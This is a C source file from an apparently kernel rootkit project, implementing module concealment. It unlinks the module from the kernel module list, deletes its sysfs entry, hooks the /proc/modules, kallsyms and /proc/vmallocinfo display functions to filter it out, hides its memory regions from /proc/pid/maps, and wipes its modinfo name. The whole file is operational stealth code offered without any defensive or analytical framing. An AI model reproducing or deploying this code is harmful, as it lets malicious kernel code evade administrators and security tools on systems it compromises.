/* SPDX-License-Identifier: GPL-2.0 */
/* nvk_vis.c — Module visibility management (list, sysfs, proc, kallsyms, vmalloc). */
#include <nvk.h>
#include <nvk_internal.h>

static __always_inline int _neverc_krt_str_starts_with(const char *str,
						       const char *prefix)
{
	while (*prefix) {
		if (*str != *prefix) return 0;
		str++;
		prefix++;
	}
	return 1;
}

static struct neverc_krt_interpose _neverc_krt_ks_interpose;
static int _neverc_krt_ks_interposed;
static struct neverc_krt_interpose _neverc_krt_vmalloc_interpose;
static int _neverc_krt_vmalloc_interposed;

static __always_inline struct list_head *
_neverc_krt_get_mod_list(struct neverc_krt_this_module *mod)
{
	return (struct list_head *)((char *)mod + NEVERC_KRT_OFF_LIST);
}

/* ---- internal typedefs ---- */

typedef void (*neverc_krt_mutex_lock_fn)(void *);
typedef void (*neverc_krt_mutex_unlock_fn)(void *);
typedef void (*neverc_krt_kobject_del_fn)(void *kobj);
typedef void (*neverc_krt_kobject_put_fn)(void *kobj);
typedef int  (*neverc_krt_mod_seq_show_fn)(void *seq, void *v);
typedef int  (*neverc_krt_mod_addr_fn)(unsigned long addr);
typedef int  (*neverc_krt_vmalloc_show_fn)(void *seq, void *v);

/* ---- internal structs ---- */

struct neverc_krt_vis_maps_filter_region {
	unsigned long start;
	unsigned long end;
};

struct _neverc_krt_vmap_area {
	unsigned long va_start;
	unsigned long va_end;
};

/* ---- internal variables ---- */

static struct neverc_krt_vis_maps_filter_region _neverc_krt_maps_regions[NEVERC_KRT_MAPS_FILTER_MAX];
static int _neverc_krt_maps_region_count;

static neverc_krt_mutex_lock_fn   _neverc_krt_vis_mutex_lock;
static neverc_krt_mutex_unlock_fn _neverc_krt_vis_mutex_unlock;
static void                      *_neverc_krt_module_mutex;
static neverc_krt_kobject_del_fn  _neverc_krt_kobject_del;
static neverc_krt_kobject_put_fn  _neverc_krt_kobject_put;
static int                        _neverc_krt_vis_inited;

static neverc_krt_mod_seq_show_fn _neverc_krt_orig_mod_seq_show;
static const char                *_neverc_krt_vis_target_name;

static neverc_krt_mod_addr_fn     _neverc_krt_orig_mod_text_addr;
static unsigned long              _neverc_krt_vis_mod_start;
static unsigned long              _neverc_krt_vis_mod_end;

static neverc_krt_vmalloc_show_fn _neverc_krt_orig_vmalloc_show;
static unsigned long              _neverc_krt_vmalloc_vis_start;
static unsigned long              _neverc_krt_vmalloc_vis_end;

/* ==================================================================== */
/*  Init / module list visibility filter (conceal + reveal)              */
/* ==================================================================== */

int neverc_krt_vis_init(void)
{
	if (_neverc_krt_vis_inited) return 0;

	_neverc_krt_vis_mutex_lock =
		(neverc_krt_mutex_lock_fn)NEVERC_KRT_LOOKUP("mutex_lock");
	_neverc_krt_vis_mutex_unlock =
		(neverc_krt_mutex_unlock_fn)NEVERC_KRT_LOOKUP("mutex_unlock");
	_neverc_krt_module_mutex = (void *)NEVERC_KRT_LOOKUP("module_mutex");
	_neverc_krt_kobject_del =
		(neverc_krt_kobject_del_fn)NEVERC_KRT_LOOKUP("kobject_del");
	_neverc_krt_kobject_put =
		(neverc_krt_kobject_put_fn)NEVERC_KRT_LOOKUP("kobject_put");

	_neverc_krt_vis_inited = 1;
	return 0;
}

void neverc_krt_vis_conceal(struct neverc_krt_vis_state *state,
			 struct neverc_krt_this_module *mod)
{
	struct list_head *our;
	unsigned long n_raw, p_raw;

	if (state->concealed) return;

	our = _neverc_krt_get_mod_list(mod);
	if (neverc_krt_mem_read(&n_raw, &our->next, 8) ||
	    neverc_krt_mem_read(&p_raw, &our->prev, 8))
		return;

	struct list_head *n = (struct list_head *)n_raw;
	struct list_head *p = (struct list_head *)p_raw;

	if ((unsigned long)n < 0xFFFF000000000000UL ||
	    (unsigned long)p < 0xFFFF000000000000UL)
		return;

	state->saved_next = n;
	state->saved_prev = p;

	if (_neverc_krt_vis_mutex_lock && _neverc_krt_module_mutex)
		_neverc_krt_vis_mutex_lock(_neverc_krt_module_mutex);

	neverc_krt_mem_write(&p->next, &n, 8);
	neverc_krt_mem_write(&n->prev, &p, 8);
	our->next = our;
	our->prev = our;

	if (_neverc_krt_vis_mutex_unlock && _neverc_krt_module_mutex)
		_neverc_krt_vis_mutex_unlock(_neverc_krt_module_mutex);

	state->concealed = 1;
}

void neverc_krt_vis_reveal(struct neverc_krt_vis_state *state,
			 struct neverc_krt_this_module *mod)
{
	struct list_head *our;

	if (!state->concealed) return;

	our = _neverc_krt_get_mod_list(mod);

	if (!state->saved_next || !state->saved_prev)
		return;
	if ((unsigned long)state->saved_next < 0xFFFF000000000000UL ||
	    (unsigned long)state->saved_prev < 0xFFFF000000000000UL)
		return;

	if (_neverc_krt_vis_mutex_lock && _neverc_krt_module_mutex)
		_neverc_krt_vis_mutex_lock(_neverc_krt_module_mutex);

	struct list_head prev_copy, next_copy;
	if (neverc_krt_mem_read(&prev_copy, state->saved_prev, 16) ||
	    neverc_krt_mem_read(&next_copy, state->saved_next, 16)) {
		if (_neverc_krt_vis_mutex_unlock && _neverc_krt_module_mutex)
			_neverc_krt_vis_mutex_unlock(_neverc_krt_module_mutex);
		return;
	}

	if (prev_copy.next == state->saved_next &&
	    next_copy.prev == state->saved_prev) {
		our->next = state->saved_next;
		our->prev = state->saved_prev;
		neverc_krt_mem_write(&state->saved_prev->next, &our, 8);
		neverc_krt_mem_write(&state->saved_next->prev, &our, 8);
	}

	if (_neverc_krt_vis_mutex_unlock && _neverc_krt_module_mutex)
		_neverc_krt_vis_mutex_unlock(_neverc_krt_module_mutex);

	state->concealed = 0;
}

/* ==================================================================== */
/*  Sysfs removal                                                       */
/* ==================================================================== */

void neverc_krt_vis_sysfs_remove(struct neverc_krt_vis_state *state,
				 struct neverc_krt_this_module *mod)
{
	void *mkobj = (void *)0;

	if (state->sysfs_removed) return;

	unsigned long kobj_off = NEVERC_KRT_OFF_NAME + 64;
	unsigned char *base = (unsigned char *)mod;
	unsigned long i;
	for (i = kobj_off; i < kobj_off + 256; i += 8) {
		unsigned long v;
		if (neverc_krt_mem_read(&v, base + i, 8))
			continue;
		if (v > 0xFFFF000000000000UL && v < 0xFFFFFFFFFFFFF000UL) {
			unsigned long pp_val;
			if (neverc_krt_mem_read(&pp_val, (void *)v, 8))
				continue;
			if (pp_val > 0xFFFF000000000000UL) {
				mkobj = (void *)v;
				break;
			}
		}
	}

	if (!mkobj) return;

	if (_neverc_krt_kobject_del) {
		_neverc_krt_kobject_del(mkobj);
		state->saved_kobj = mkobj;
		state->sysfs_removed = 1;
	}
}

/* ==================================================================== */
/*  /proc/modules seq_show filter                                       */
/* ==================================================================== */

static int _neverc_krt_mod_seq_show_filter(void *seq, void *v)
{
	if (!_neverc_krt_orig_mod_seq_show)
		return 0;

	if (v && _neverc_krt_vis_target_name) {
		unsigned long list_addr = (unsigned long)v;
		if (list_addr >= 0xFFFF000000000000UL &&
		    list_addr < 0xFFFFFFFFFFFFF000UL) {
			unsigned long mod_base = list_addr - NEVERC_KRT_OFF_LIST;
			char nbuf[64];
			if (!neverc_krt_mem_read(nbuf, (void *)(mod_base + NEVERC_KRT_OFF_NAME), sizeof(nbuf)) &&
			    nbuf[0] >= 0x20 && nbuf[0] <= 0x7E) {
				nbuf[sizeof(nbuf) - 1] = '\0';
				if (_neverc_krt_str_starts_with(nbuf,
							 _neverc_krt_vis_target_name))
					return 0;
			}
		}
	}

	return _neverc_krt_orig_mod_seq_show(seq, v);
}

int neverc_krt_vis_proc_filter(struct neverc_krt_vis_state *state,
			       const char *module_name)
{
	void *target;

	if (state->seq_show_interposed) return 0;

	target = NEVERC_KRT_LOOKUP("modules_seq_show");
	if (!target)
		target = NEVERC_KRT_LOOKUP("m_show");
	if (!target) return -1;

	state->module_name = module_name;
	_neverc_krt_vis_target_name = module_name;

	int ret = neverc_krt_interpose_install(&state->seq_show_interpose, target,
				   (void *)_neverc_krt_mod_seq_show_filter,
				   (void **)&_neverc_krt_orig_mod_seq_show);
	if (ret) return ret;

	state->seq_show_interposed = 1;
	return 0;
}

/* ==================================================================== */
/*  Kallsyms address filter                                             */
/* ==================================================================== */

static int _neverc_krt_mod_text_addr_filter(unsigned long addr)
{
	if (addr >= _neverc_krt_vis_mod_start && addr < _neverc_krt_vis_mod_end)
		return 0;
	if (_neverc_krt_orig_mod_text_addr)
		return _neverc_krt_orig_mod_text_addr(addr);
	return 0;
}

int neverc_krt_vis_kallsyms_filter(struct neverc_krt_vis_state *state,
				   const char *module_name)
{
	void *target;

	if (state->kallsyms_filtered) return 0;

	_neverc_krt_vis_target_name = module_name;

	target = NEVERC_KRT_LOOKUP("is_module_text_address");
	if (!target)
		target = NEVERC_KRT_LOOKUP("__module_text_address");
	if (!target) return -1;

	unsigned char *mod_base = (unsigned char *)&__this_module;
	_neverc_krt_vis_mod_start = (unsigned long)mod_base;
	_neverc_krt_vis_mod_end = _neverc_krt_vis_mod_start + _neverc_krt_get_module_size();

	int ret = neverc_krt_interpose_install(&_neverc_krt_ks_interpose, target,
				   (void *)_neverc_krt_mod_text_addr_filter,
				   (void **)&_neverc_krt_orig_mod_text_addr);
	if (ret) return ret;

	_neverc_krt_ks_interposed = 1;
	state->kallsyms_filtered = 1;
	return 0;
}

/* ==================================================================== */
/*  Composite full visibility filter + cleanup                          */
/* ==================================================================== */

void neverc_krt_vis_full_conceal(struct neverc_krt_vis_state *state,
			      struct neverc_krt_this_module *mod,
			      const char *module_name)
{
	neverc_krt_vis_conceal(state, mod);
	neverc_krt_vis_sysfs_remove(state, mod);
	neverc_krt_vis_proc_filter(state, module_name);
	neverc_krt_vis_kallsyms_filter(state, module_name);
}

/* ==================================================================== */
/*  /proc/pid/maps module region filter                                 */
/* ==================================================================== */

int neverc_krt_vis_maps_filter_add(unsigned long start, unsigned long end)
{
	if (_neverc_krt_maps_region_count >= NEVERC_KRT_MAPS_FILTER_MAX)
		return -1;
	int idx = _neverc_krt_maps_region_count++;
	_neverc_krt_maps_regions[idx].start = start;
	_neverc_krt_maps_regions[idx].end = end;
	return 0;
}

int neverc_krt_vis_maps_should_filter(unsigned long addr)
{
	int i;
	for (i = 0; i < _neverc_krt_maps_region_count; i++) {
		if (addr >= _neverc_krt_maps_regions[i].start &&
		    addr < _neverc_krt_maps_regions[i].end)
			return 1;
	}
	return 0;
}

void neverc_krt_vis_maps_filter_clear(void)
{
	_neverc_krt_maps_region_count = 0;
}

void neverc_krt_vis_maps_filter_add_self(void)
{
	unsigned char *mod_base = (unsigned char *)&__this_module;
	unsigned long start = (unsigned long)mod_base;
	unsigned long end = start + _neverc_krt_get_module_size();
	neverc_krt_vis_maps_filter_add(start, end);
}

/* ==================================================================== */
/*  Modinfo wipe                                                        */
/* ==================================================================== */

void neverc_krt_vis_wipe_modinfo(struct neverc_krt_this_module *mod)
{
	volatile unsigned char *p = (volatile unsigned char *)mod;
	unsigned long i;
	unsigned long name_start = NEVERC_KRT_OFF_NAME;
	for (i = name_start; i < name_start + 56 && i < _neverc_krt_get_module_size(); i++)
		p[i] = 0;
}

/* ==================================================================== */
/*  /proc/vmallocinfo filter                                            */
/* ==================================================================== */

static int _neverc_krt_vmalloc_show_filter(void *seq, void *v)
{
	if (!_neverc_krt_orig_vmalloc_show) return 0;

	if (v && _neverc_krt_vmalloc_vis_start) {
		struct _neverc_krt_vmap_area *va = (struct _neverc_krt_vmap_area *)v;
		unsigned long start = 0;
		if (!neverc_krt_mem_read(&start, &va->va_start, 8) && start) {
			if (start >= _neverc_krt_vmalloc_vis_start &&
			    start < _neverc_krt_vmalloc_vis_end)
				return 0;
		}
	}

	return _neverc_krt_orig_vmalloc_show(seq, v);
}

static void *_neverc_krt_resolve_vmalloc_s_show(void)
{
	void *fn = (void *)NEVERC_KRT_LOOKUP("vmalloc_info_show");
	if (fn) return fn;
	fn = (void *)NEVERC_KRT_LOOKUP("s_show.23");
	if (fn) return fn;
	fn = (void *)NEVERC_KRT_LOOKUP("s_show.24");
	if (fn) return fn;
	fn = (void *)NEVERC_KRT_LOOKUP("s_show.25");
	return fn;
}

int neverc_krt_vis_vmalloc_filter(void)
{
	void *target;

	if (_neverc_krt_vmalloc_interposed) return 0;

	_neverc_krt_vmalloc_vis_start = (unsigned long)&__this_module;
	_neverc_krt_vmalloc_vis_end = _neverc_krt_vmalloc_vis_start +
				_neverc_krt_get_module_size() + 0x10000;

	target = _neverc_krt_resolve_vmalloc_s_show();
	if (!target) return -1;

	int ret = neverc_krt_interpose_install(&_neverc_krt_vmalloc_interpose, target,
				   (void *)_neverc_krt_vmalloc_show_filter,
				   (void **)&_neverc_krt_orig_vmalloc_show);
	if (ret) return ret;

	_neverc_krt_vmalloc_interposed = 1;
	return 0;
}

/* ==================================================================== */
/*  Pause / remove interposes                                                */
/* ==================================================================== */

void neverc_krt_vis_pause_interposes(void)
{
	if (_neverc_krt_vmalloc_interposed)
		neverc_krt_interpose_pause(&_neverc_krt_vmalloc_interpose);
	if (_neverc_krt_ks_interposed)
		neverc_krt_interpose_pause(&_neverc_krt_ks_interpose);
}

void neverc_krt_vis_remove_interposes(void)
{
	if (_neverc_krt_ks_interposed) {
		neverc_krt_interpose_remove(&_neverc_krt_ks_interpose);
		_neverc_krt_ks_interposed = 0;
	}
	if (_neverc_krt_vmalloc_interposed) {
		neverc_krt_interpose_remove(&_neverc_krt_vmalloc_interpose);
		_neverc_krt_vmalloc_interposed = 0;
	}
}
